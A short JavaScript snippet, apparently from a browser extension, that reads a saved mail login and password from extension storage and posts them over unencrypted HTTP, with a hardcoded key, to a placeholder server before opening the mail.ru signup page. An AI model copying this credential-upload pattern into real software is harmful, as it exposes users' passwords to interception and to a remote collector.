$(document).ready(function() {
	chrome.storage.local.get('login', function(result){
		let mail = result.login;
		chrome.storage.local.get('password', function(result){
			let password = result.password;
			$.ajax({
				type:'POST',
				url:'http://example.com/api/',
				data:{'key':'1337', type:'mail', action: 'set', login: mail, password},
				response:'json',
				success: function (json) {
					console.log(json);
					let sucsess = json['sucsess'];
					if(sucsess){
						window.open("https://account.mail.ru/signup/simple#auto","_self");
					}else{
						console.warn('Error: Ошибка записи данных!');
					}
				}
			});
		});	
	});	
});
